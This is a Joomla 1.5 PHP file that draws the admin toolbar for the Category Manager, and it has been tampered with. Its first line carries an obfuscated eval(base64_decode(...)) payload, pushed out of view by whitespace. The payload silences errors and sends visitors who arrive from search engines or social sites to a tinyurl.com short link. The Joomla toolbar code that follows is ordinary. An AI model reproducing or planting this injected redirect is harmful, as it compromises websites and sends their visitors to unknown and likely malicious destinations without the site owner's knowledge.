<?php	                                       			eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokbmNjdj1oZWFkZXJzX3NlbnQoKTsNCmlmICghJG5jY3Ypew0KJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOw0KJHVhPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsNCmlmIChzdHJpc3RyKCRyZWZlcmVyLCJ5YWhvbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmciKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJyYW1ibGVyIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZ29nbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImxpdmUuY29tIilvciBzdHJpc3RyKCRyZWZlcmVyLCJhcG9ydCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm5pZ21hIikgb3Igc3RyaXN0cigkcmVmZXJlciwid2ViYWx0YSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJlZ3VuLnJ1Iikgb3Igc3RyaXN0cigkcmVmZXJlciwic3R1bWJsZXVwb24uY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYml0Lmx5Iikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm15c3BhY2UuY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZmFjZWJvb2suY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpKSB7DQppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgb3IgIXN0cmlzdHIoJHJlZmVyZXIsImludXJsIikpewkJDQoJCWhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly90aW55dXJsLmNvbS9hZWxud2o0Iik7DQoJCWV4aXQoKTsNCgl9DQp9DQp9"));
/**
 * @version		$Id: toolbar.categories.html.php 14401 2010-01-26 14:10:00Z louis $
 * @package		Joomla
 * @subpackage	Categories
 * @copyright	Copyright (C) 2005 - 2010 Open Source Matters. All rights reserved.
 * @license		GNU/GPL, see LICENSE.php
 * Joomla! is free software. This version may have been modified pursuant
 * to the GNU General Public License, and as distributed it includes or
 * is derivative of works licensed under the GNU General Public License or
 * other free or open source software licenses.
 * See COPYRIGHT.php for copyright notices and details.
 */

/**
* @package		Joomla
* @subpackage	Categories
*/
class TOOLBAR_categories {
	/**
	* Draws the menu for Editing an existing category
	* @param int The published state (to display the inverse button)
	*/
	function _EDIT($edit)
	{
		$cid = JRequest::getVar( 'cid', array(0), '', 'array' );
		$section = JRequest::getCmd( 'section' );

		$text = ( $edit ? JText::_( 'Edit' ) : JText::_( 'New' ) );

		JToolBarHelper::title( JText::_( 'Category' ) .': <small><small>[ '. $text.' ]</small></small>', 'categories.png' );
		JToolBarHelper::save();
		JToolBarHelper::apply();
		if ($edit) {
			// for existing articles the button is renamed `close`
			JToolBarHelper::cancel( 'cancel', 'Close' );
		} else {
			JToolBarHelper::cancel();
		}
		JToolBarHelper::help( 'screen.' . substr( $section, 4 ) . '.categories.edit' );
	}

	/**
	* Draws the menu for Moving existing categories
	* @param int The published state (to display the inverse button)
	*/
	function _MOVE() {

		JToolBarHelper::title( JText::_( 'Category' ) .': <small><small>[ '. JText::_( 'Move' ).' ]</small></small>', 'categories.png' );
		JToolBarHelper::save( 'movesave' );
		JToolBarHelper::cancel();
	}

	/**
	* Draws the menu for Copying existing categories
	* @param int The published state (to display the inverse button)
	*/
	function _COPY() {
		JToolBarHelper::title( JText::_( 'Category' ) .': <small><small>[ '. JText::_( 'Copy' ).' ]</small></small>', 'categories.png' );

		JToolBarHelper::save( 'copysave' );
		JToolBarHelper::cancel();
	}

	/**
	* Draws the menu for Editing an existing category
	*/
	function _DEFAULT()
	{
		$section = JRequest::getCmd( 'section' );

		JToolBarHelper::title( JText::_( 'Category Manager' ) .': <small><small>[ '. JText::_(JString::substr($section, 4)).' ]</small></small>', 'categories.png' );
		JToolBarHelper::publishList();
		JToolBarHelper::unpublishList();

		if ( $section == 'com_content' || ( $section > 0 ) ) {
			JToolBarHelper::customX( 'moveselect', 'move.png', 'move_f2.png', 'Move', true );
			JToolBarHelper::customX( 'copyselect', 'copy.png', 'copy_f2.png', 'Copy', true );
		}
		JToolBarHelper::deleteList();
		JToolBarHelper::editListX();
		JToolBarHelper::addNewX();
		JToolBarHelper::help( 'screen.' . substr( $section, 4 ) . '.categories' );
	}
}